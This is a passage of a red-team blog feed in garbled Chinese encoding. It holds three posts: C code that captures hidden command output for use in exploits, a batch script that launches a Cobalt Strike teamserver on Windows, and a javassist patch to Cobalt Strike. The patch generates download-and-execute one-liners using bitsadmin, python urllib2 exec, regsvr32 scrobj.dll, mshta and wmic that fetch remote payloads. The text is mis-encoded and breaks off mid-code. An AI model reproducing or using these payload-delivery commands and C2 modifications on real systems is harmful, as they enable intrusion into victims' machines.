    
    </summary>
    
      <category term="è¿ç»´" scheme="https://evi1cg.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
  </entry>
  
  <entry>
    <title>åŒ¿åç®¡é“è¯»å–CMDå›æ˜¾ä¿¡æ¯</title>
    <link href="https://evi1cg.github.io/archives/Get_cmd.html"/>
    <id>https://evi1cg.github.io/archives/Get_cmd.html</id>
    <published>2018-09-12T01:15:00.000Z</published>
    <updated>2019-01-14T14:44:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘æ”¹expçš„æ—¶å€™ç”¨åˆ°çš„ï¼ŒåŠ åˆ°expé‡Œé¢å›æ˜¾æ‰§è¡Œä¿¡æ¯ï¼Œä¿å­˜ä¸€ä»½~<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXE_NAME    NULL<span class="comment">//TEXT("Cmd.exe")</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXE_CMD     TEXT(<span class="meta-string">"Cmd.exe /C ipconfig/all"</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> Buffer[<span class="number">4096</span>];</span><br><span class="line">        STARTUPINFO sInfo;<span class="comment">//æ–°è¿›ç¨‹çš„ä¸»çª—å£ç‰¹æ€§</span></span><br><span class="line">        PROCESS_INFORMATION pInfo;</span><br><span class="line">        SECURITY_ATTRIBUTES sa;</span><br><span class="line">        HANDLE hRead, hWrite;</span><br><span class="line">        DWORD bytesRead;    <span class="comment">//è¯»å–ä»£ç çš„é•¿åº¦</span></span><br><span class="line">        sa.nLength = <span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES);/ /ç»“æ„ä½“çš„å¤§å°ï¼Œå¯ç”¨SIZEOFå–å¾—</span><br><span class="line">        sa.lpSecurityDescriptor = <span class="literal">NULL</span>;<span class="comment">//å®‰å…¨æè¿°ç¬¦</span></span><br><span class="line">        sa.bInheritHandle = TRUE;;/ /å®‰å…¨æè¿°çš„å¯¹è±¡èƒ½å¦è¢«æ–°åˆ›å»ºÃ†Ã†çš„è¿›ç¨‹ç»§æ‰¿</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!CreatePipe(&amp;hRead, &amp;hWrite, &amp;sa, <span class="number">0</span>)) <span class="comment">//åˆ›å»ºåŒ¿åç®¡é“</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> GetLastError();<span class="comment">//è¿”å›æœ€è¿‘çš„ä¸€ä¸ªé”™è¯¯ï¼Œ0è¡¨ç¤ºæ­£å¸¸</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        GetStartupInfo(&amp;sInfo)ï¼›</span><br><span class="line">        sInfo.cb = <span class="keyword">sizeof</span>(sInfo);</span><br><span class="line">        sInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;</span><br><span class="line">        sInfo.wShowWindow = SW_HIDE;</span><br><span class="line">        sInfo.hStdError = hWrite;   <span class="comment">//å°†ç®¡é“çš„å†™ç«¯äº¤ç»™å­è¿›ç¨‹</span></span><br><span class="line">        sInfo.hStdOutput = hWrite;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;pInfo, <span class="number">0</span>, <span class="keyword">sizeof</span>(pInfo));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!CreateProcess(EXE_NAME, EXE_CMD, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;sInfo, &amp;pInfo)) <span class="comment">//åˆ›å»ºå­è¿›ç¨‹</span></span><br><span class="line">        &#123;</span><br><span class="line">            CloseHandle(hWrite);</span><br><span class="line">            CloseHandle(hRead);</span><br><span class="line">            <span class="keyword">return</span> GetLastError();</span><br><span class="line">        &#125;</span><br><span class="line">        CloseHandle(hWrite); <span class="comment">//å…³é—­çˆ¶è¿›ç¨‹çš„å†™ç«¯</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!ReadFile(hRead, Buffer, <span class="keyword">sizeof</span>(Buffer) - <span class="number">1</span>, &amp;bytesRead, <span class="literal">NULL</span>)) <span class="comment">//è¯»å–å†…å®¹</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Buffer[bytesRead] = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, Buffer);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        WaitForSingleObject(pInfo.hProcess, INFINITE);<span class="comment">//å½“ç­‰å¾…ä»åœ¨æŒ‚èµ·çŠ¶æ€æ—¶ï¼Œå¥æŸ„è¢«å…³é—­ï¼Œé‚£ä¹ˆå‡½æ•°è¡Œä¸ºæ˜¯æœªå®šä¹‰çš„ã€‚è¯¥å¥æŸ„å¿…é¡»å…·æœ‰ SYNCHRONIZE è®¿é—®æƒé™;</span></span><br><span class="line">    CloseHandle(hRead);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>from: <a href="http://www.cnblogs.com/onlyac/p/5346478.html" target="_blank" rel="noopener">http://www.cnblogs.com/onlyac/p/5346478.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æœ€è¿‘æ”¹expçš„æ—¶å€™ç”¨åˆ°çš„ï¼ŒåŠ åˆ°expé‡Œé¢å›æ˜¾æ‰§è¡Œä¿¡æ¯ï¼Œä¿å­˜ä¸€ä»½~&lt;br&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span
      
    
    </summary>
    
      <category term="éšä¾¿å†™å†™" scheme="https://evi1cg.github.io/categories/%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/"/>
    
    
  </entry>
  
  <entry>
    <title>CS teamserver.bat</title>
    <link href="https://evi1cg.github.io/archives/teamserver.html"/>
    <id>https://evi1cg.github.io/archives/teamserver.html</id>
    <published>2018-09-10T01:40:00.000Z</published>
    <updated>2019-01-15T05:43:36.768Z</updated>
    
    <content type="html"><![CDATA[<p>CSçš„teamserverç»å¸¸æ˜¯åœ¨linuxæœåŠ¡å™¨ä¸Šè·‘çš„ï¼Œæœ‰å°ä¼™ä¼´é—®åœ¨win serverä¸Šæ€ä¹ˆè·‘ï¼Œæ‰€ä»¥å¼„äº†ä¸€ä¸ªæ‰¹å¤„ç†ï¼Œéœ€è¦çš„çœ‹ç€æ”¹æ”¹ï¼Œwinä¸Šé¢éœ€è¦è£…<a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener"><code>java JDK</code></a>,winä¸Šé»˜è®¤æ²¡æœ‰keytool,æ‰€ä»¥éœ€è¦è‡ªå·±å»ç”Ÿæˆä¸€ä¸ªcobaltstrike.store ~<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off   </span><br><span class="line">:check_java</span><br><span class="line">    java -version &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="variable">%errorLevel%</span> == <span class="number">0</span> (</span><br><span class="line"><span class="function">        goto:<span class="title">check_permissions</span></span></span><br><span class="line"><span class="function">    ) <span class="title">else</span> (</span></span><br><span class="line"><span class="function">        <span class="title">echo</span> [-] <span class="title">is</span> <span class="title">Java</span> <span class="title">installed</span>?</span></span><br><span class="line"><span class="function">        <span class="title">goto:eof</span></span></span><br><span class="line"><span class="function">    )</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">:<span class="title">check_permissions</span></span></span><br><span class="line"><span class="function">    <span class="title">echo</span> [+] <span class="title">Administrative</span> <span class="title">permissions</span> <span class="title">required</span>. <span class="title">Detecting</span> <span class="title">permissions</span>...</span></span><br><span class="line"><span class="function">    <span class="title">set</span> <span class="title">TempFile_Name</span>=%<span class="title">SystemRoot</span>%\<span class="title">System32</span>\<span class="title">BatTestUACin_SysRt</span>%<span class="title">Random</span>%.<span class="title">batemp</span></span></span><br><span class="line"><span class="function">    (<span class="title">echo</span> "<span class="title">BAT</span> <span class="title">Test</span> <span class="title">UAC</span> <span class="title">in</span> <span class="title">Temp</span>" &gt;%<span class="title">TempFile_Name</span>% ) 1&gt;<span class="title">nul</span> 2&gt;<span class="title">nul</span></span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">exist</span> %<span class="title">TempFile_Name</span>% (</span></span><br><span class="line"><span class="function">        <span class="title">echo</span> [+] <span class="title">Success</span>: <span class="title">Administrative</span> <span class="title">permissions</span> <span class="title">confirmed</span>.</span></span><br><span class="line"><span class="function"><span class="title">del</span> %<span class="title">TempFile_Name</span>% 1&gt;<span class="title">nul</span> 2&gt;<span class="title">nul</span></span></span><br><span class="line"><span class="function">        <span class="title">goto:check_certificate</span></span></span><br><span class="line"><span class="function">    ) <span class="title">else</span> (</span></span><br><span class="line"><span class="function">        <span class="title">echo</span> [-] <span class="title">Failure</span>: <span class="title">Current</span> <span class="title">permissions</span> <span class="title">inadequate</span>.</span></span><br><span class="line"><span class="function">        <span class="title">goto:eof</span></span></span><br><span class="line"><span class="function">    )</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">:<span class="title">check_certificate</span></span></span><br><span class="line"><span class="function">    <span class="title">set</span> <span class="title">certificate</span>=".\<span class="title">cobaltstrike.store</span>"</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">exist</span> %<span class="title">certificate</span>% (</span></span><br><span class="line"><span class="function">        <span class="title">goto:test_arguments</span></span></span><br><span class="line"><span class="function">    ) <span class="title">else</span> (</span></span><br><span class="line"><span class="function">        <span class="title">echo</span> [!] <span class="title">Please</span> <span class="title">generate</span> <span class="title">the</span> <span class="title">cobaltstrike.store</span> !</span></span><br><span class="line"><span class="function">        <span class="title">echo</span> [!] <span class="title">Example</span>: <span class="title">keytool</span> -<span class="title">keystore</span> ./<span class="title">cobaltstrike.store</span> -<span class="title">storepass</span> 123456 -<span class="title">keypass</span> 123456 -<span class="title">genkey</span> -<span class="title">keyalg</span> <span class="title">RSA</span> -<span class="title">alias</span> <span class="title">cobaltstrike</span> -<span class="title">dname</span> "<span class="title">CN</span>=<span class="title">Major</span> <span class="title">Cobalt</span> <span class="title">Strike</span>, <span class="title">OU</span>=<span class="title">AdvancedPenTesting</span>, <span class="title">O</span>=<span class="title">cobaltstrike</span>, <span class="title">L</span>=<span class="title">Somewhere</span>, <span class="title">S</span>=<span class="title">Cyberspace</span>, <span class="title">C</span>=<span class="title">Earth</span>"</span></span><br><span class="line"><span class="function">        <span class="title">goto:eof</span></span></span><br><span class="line"><span class="function">    )</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">:<span class="title">test_arguments</span></span></span><br><span class="line"><span class="function">    <span class="title">set</span> <span class="title">argC</span>=0</span></span><br><span class="line"><span class="function">    <span class="title">for</span> %%<span class="title">x</span> <span class="title">in</span> (%*) <span class="title">do</span> <span class="title">Set</span> /<span class="title">A</span> <span class="title">argC</span>+=1</span></span><br><span class="line"><span class="function">    <span class="title">if</span> %<span class="title">argC</span>% <span class="title">LSS</span> 2 (</span></span><br><span class="line"><span class="function">        <span class="title">echo</span> [-] <span class="title">teamserver</span> ^&lt;<span class="title">host</span>^&gt; ^&lt;<span class="title">password</span>^&gt; [/<span class="title">path</span>/<span class="title">to</span>/<span class="title">c2.profile</span>] [<span class="title">YYYY</span>-<span class="title">MM</span>-<span class="title">DD</span>]</span></span><br><span class="line"><span class="function">        <span class="title">echo</span>     ^&lt;<span class="title">host</span>^&gt; <span class="title">is</span> <span class="title">the</span> <span class="title">default</span> <span class="title">IP</span> <span class="title">address</span> <span class="title">of</span> <span class="title">this</span> <span class="title">Cobalt</span> <span class="title">Strike</span> <span class="title">team</span> <span class="title">server</span></span></span><br><span class="line"><span class="function">        <span class="title">echo</span>     ^&lt;<span class="title">password</span>^&gt; <span class="title">is</span> <span class="title">the</span> <span class="title">shared</span> <span class="title">password</span> <span class="title">to</span> <span class="title">connect</span> <span class="title">to</span> <span class="title">this</span> <span class="title">server</span></span></span><br><span class="line"><span class="function">        <span class="title">echo</span>     [/<span class="title">path</span>/<span class="title">to</span>/<span class="title">c2.profile</span>] <span class="title">is</span> <span class="title">your</span> <span class="title">Malleable</span> <span class="title">C2</span> <span class="title">profile</span></span></span><br><span class="line"><span class="function">        <span class="title">echo</span>     [<span class="title">YYYY</span>-<span class="title">MM</span>-<span class="title">DD</span>] <span class="title">is</span> <span class="title">a</span> <span class="title">kill</span> <span class="title">date</span> <span class="title">for</span> <span class="title">Beacon</span> <span class="title">payloads</span> <span class="title">run</span> <span class="title">from</span> <span class="title">this</span> <span class="title">server</span></span></span><br><span class="line"><span class="function">        <span class="title">goto:eof</span></span></span><br><span class="line"><span class="function">    ) <span class="title">else</span> (</span></span><br><span class="line"><span class="function">        <span class="title">goto:run_cobal</span></span></span><br><span class="line"><span class="function">    )</span></span><br><span class="line"><span class="function">:<span class="title">run_cobal</span></span></span><br><span class="line"><span class="function">    <span class="title">java</span> -<span class="title">XX:ParallelGCThreads</span>=4 -<span class="title">Dcobaltstrike.server_port</span>=50050 -<span class="title">Djavax.net.ssl.keyStore</span>=./<span class="title">cobaltstrike.store</span> -<span class="title">Djavax.net.ssl.keyStorePassword</span>=123456 -<span class="title">server</span> -<span class="title">XX</span>:+<span class="title">AggressiveHeap</span> -<span class="title">XX</span>:+<span class="title">UseParallelGC</span> -<span class="title">classpath</span> ./<span class="title">cobaltstrike.jar</span> <span class="title">server.TeamServer</span> %*</span></span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io/usr/uploads/2018/09/3568965996.png" alt="90107-dm8rzqvop8m.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CSçš„teamserverç»å¸¸æ˜¯åœ¨linuxæœåŠ¡å™¨ä¸Šè·‘çš„ï¼Œæœ‰å°ä¼™ä¼´é—®åœ¨win serverä¸Šæ€ä¹ˆè·‘ï¼Œæ‰€ä»¥å¼„äº†ä¸€ä¸ªæ‰¹å¤„ç†ï¼Œéœ€è¦çš„çœ‹ç€æ”¹æ”¹ï¼Œwinä¸Šé¢éœ€è¦è£…&lt;a href=&quot;http://www.oracle.com/technetwork/java/javase/downlo
      
    
    </summary>
    
      <category term="å·¥å…·æ”¶é›†" scheme="https://evi1cg.github.io/categories/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"/>
    
    
      <category term="cobaltstrike" scheme="https://evi1cg.github.io/tags/cobaltstrike/"/>
    
  </entry>
  
  <entry>
    <title>Cobal Strike è‡ªå®šä¹‰OneLiner</title>
    <link href="https://evi1cg.github.io/archives/Custom_Oneliner.html"/>
    <id>https://evi1cg.github.io/archives/Custom_Oneliner.html</id>
    <published>2018-06-26T23:51:00.000Z</published>
    <updated>2019-01-16T05:15:06.566Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-èµ·å› "><a href="#0x00-èµ·å› " class="headerlink" title="0x00 èµ·å› "></a>0x00 èµ·å› </h2><p>åœ¨ä½¿ç”¨Cobal Strikeçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é‡Œé¢å·²ç»é›†æˆäº†å‡ ç§ Script Web Deliveryï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/06/1971275379.png" alt="19484-drjxyu0m4wg.png"></p><p>è€Œä¸”åœ¨ç”Ÿæˆä»¥åæ‰“å¼€site,åªéœ€è¦ç‚¹å‡»<code>Copy URL</code>å°±å¯ä»¥æŠŠå‘½ä»¤å¤åˆ¶å‡ºæ¥ï¼Œå†å†™aggressorè„šæœ¬æ—¶ä¹Ÿæƒ³è¦å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œå‘ç°copyä»¥ååªæœ‰urlï¼Œå¹¶æ²¡æœ‰å‘½ä»¤ï¼Œæ‰€ä»¥ä¸ºäº†ä¸€æ¢ç©¶ç«Ÿï¼Œè¿˜æ˜¯æŠŠCSè§£å‹ï¼Œgrepäº†ä¸€æŠŠï¼Œå®šä½åˆ°common.CommonUtilsï¼Œå‘ç°äº†OneLineræ–¹æ³•ï¼š<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/93915533.png" alt="73927-nvotona7nxc.png"></p><p>æ‰€ä»¥è¦å®ç°è¿™ä¸ªåŠŸèƒ½æˆ‘ä»¬å°±éœ€è¦å¯¹è¿™ä¸ªclassè¿›è¡Œä¿®æ”¹ï¼Œå¢åŠ æˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ã€‚</p><h2 id="0x01-ä½¿ç”¨javassistä¿®æ”¹class"><a href="#0x01-ä½¿ç”¨javassistä¿®æ”¹class" class="headerlink" title="0x01 ä½¿ç”¨javassistä¿®æ”¹class"></a>0x01 ä½¿ç”¨javassistä¿®æ”¹class</h2><p>Javassistæ˜¯ä¸€ä¸ªèƒ½å¤Ÿæ“ä½œå­—èŠ‚ç æ¡†æ¶ï¼Œé€šè¿‡å®ƒæˆ‘ä»¬èƒ½å¾ˆè½»æ˜“çš„ä¿®æ”¹classä»£ç ã€‚é¦–å…ˆä¸‹è½½<a href="https://github.com/jboss-javassist/javassist/releases" target="_blank" rel="noopener">javassist</a> ï¼Œæ–°å»ºä¸€ä¸ªjavaå·¥ç¨‹ï¼Œå³é”®å·¥ç¨‹å¯¼å…¥javassiståŒ…ã€‚</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/06/642698054.png" alt="15585-gsx22q9953w.png"></p><p>æˆ‘ä»¬å¯èƒ½å¸¸ç”¨<code>mshta http://host/test.png</code> çš„æ–¹å¼æ¥è¯·æ±‚payloadï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸‹ä»£ç è¿›è¡Œæ·»åŠ ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> changeclass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">change</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">updateMethod();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">updateMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">ClassPool cPool = <span class="keyword">new</span> ClassPool(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//å¦‚æœè¯¥æ–‡ä»¶å¼•å…¥äº†å…¶å®ƒç±»ï¼Œéœ€è¦åˆ©ç”¨ç±»ä¼¼å¦‚ä¸‹æ–¹å¼å£°æ˜</span></span><br><span class="line"><span class="comment">//cPool.importPackage("java.util.List");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾ç½®cobaltstrike.jaræ–‡ä»¶çš„ä½ç½®</span></span><br><span class="line">cPool.insertClassPath(<span class="string">"/tmp/cobaltstrike.jar"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–è¯¥è¦ä¿®æ”¹çš„classå¯¹è±¡</span></span><br><span class="line">CtClass cClass = cPool.get(<span class="string">"common.CommonUtils"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–åˆ°å¯¹åº”çš„æ–¹æ³•</span></span><br><span class="line">CtMethod cMethod = cClass.getDeclaredMethod(<span class="string">"OneLiner"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ›´æ”¹è¯¥æ–¹æ³•çš„å†…éƒ¨å®ç°</span></span><br><span class="line"><span class="comment">//éœ€è¦æ³¨æ„çš„æ˜¯å¯¹äºå‚æ•°çš„å¼•ç”¨è¦ä»¥$å¼€å§‹ï¼Œä¸èƒ½ç›´æ¥è¾“å…¥å‚æ•°åç§°</span></span><br><span class="line">cMethod.setBody(<span class="string">"&#123; if (\"bitsadmin\".equals($2)) &#123;"</span></span><br><span class="line">+ <span class="string">"String f = garbage(\"temp\");"</span></span><br><span class="line">+ <span class="string">"return \"cmd.exe /c bitsadmin /transfer \" + f + \" \" + $1 + \" %APPDATA%\\\\\" + f + \".exe&amp;%APPDATA%\\\\\" + f + \".exe&amp;del %APPDATA%\\\\\" + f + \".exe\";&#125;"</span></span><br><span class="line">+ <span class="string">"if (\"powershell\".equals($2)) &#123;"</span></span><br><span class="line">+ <span class="string">"return PowerShellOneLiner($1);&#125;"</span></span><br><span class="line">+ <span class="string">"if (\"python\".equals($2)) &#123;"</span></span><br><span class="line">+ <span class="string">"return \"python -c \\\"import urllib2; exec urllib2.urlopen('\" + $1 + \"').read();\\\"\";&#125;"</span></span><br><span class="line">+ <span class="string">"if (\"regsvr32\".equals($2)) &#123;"</span></span><br><span class="line">+ <span class="string">"return \"regsvr32 /s /n /u /i:\" + $1 + \" scrobj.dll\";&#125;"</span></span><br><span class="line">+ <span class="string">"if (\"mshta\".equals($2)) &#123;"</span></span><br><span class="line">+ <span class="string">"return \"mshta \" + $1;&#125;"</span></span><br><span class="line">+ <span class="string">"if (\"wmic\".equals($2)) &#123;"</span></span><br><span class="line">+ <span class="string">"  return \"wmic os get /format:\\\"\" + $1 + \"\\\"\";&#125;"</span></span><br><span class="line">+ <span class="string">"print_error(\"'\" + $2 + \"' for URL '\" + $1 + \"' does not have a one-liner\");"</span></span><br><span class="line">+ <span class="string">"throw new RuntimeException(\"'\" + $2 + \"' for URL '\" + $1 + \"' does not have a one-liner\");&#125;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¿®æ”¹ä»¥åè¾“å‡ºç›®å½•</span></span><br><span class="line">cClass.writeFile(<span class="string">"/tmp/"</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">"=======ä¿®æ”¹æ–¹æ³•å®Œ========="</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (CannotCompileException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>åœ¨è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œæ–¹æ³• OneLiner(String url, String type)æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œæ–¹æ³•ä¸­çš„å‚æ•°ä» <code>$1</code> å¼€å§‹ï¼Œè‹¥è¯¥æ–¹æ³•ä¸ºé static æ–¹æ³•ï¼Œå¯ä»¥ç”¨ <code>$0</code> æ¥è¡¨ç¤ºè¯¥æ–¹æ³•å®ä¾‹è‡ªèº«ï¼Œè‹¥è¯¥æ–¹æ³•ä¸º static æ–¹æ³•ï¼Œåˆ™ <code>$0</code> ä¸å¯ç”¨ã€‚è€Œä¸”å†™çš„ä»£ç éœ€è¦å°†<code>&quot;</code>, <code>\</code> è¿›è¡Œè½¬ä¹‰ã€‚</p></blockquote><p>è¿è¡Œæ­¤ä»£ç ï¼Œå¯æˆåŠŸç”Ÿæˆä¸€ä¸ªæ–°çš„class:<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/954541639.png" alt="39332-5o637aqvh1.png"></p><p><img src="https://evi1cg.github.io/usr/uploads/2018/06/3152049107.png" alt="41077-02rq3jqomynr.png"></p><p>å°†æ­¤classæ›¿æ¢CSä¸­çš„classå°±å¥½äº†ã€‚</p><p>ä½¿ç”¨çš„æ—¶å€™åªéœ€è¦åœ¨aggressorä¸­site_hostä¸­æŒ‡å®šå³å¯ï¼Œä¾‹å¦‚ä½¿ç”¨wmic<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site_host(<span class="built_in">%options</span>[<span class="string">"host"</span>], <span class="built_in">%options</span>[<span class="string">"port"</span>], <span class="built_in">%options</span>[<span class="string">"uri"</span>], <span class="built_in">$data</span>, <span class="string">"text/plain"</span>, <span class="string">"Scripted Web Delivery (wmic)"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨mshta<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site_host(<span class="built_in">%options</span>[<span class="string">"host"</span>], <span 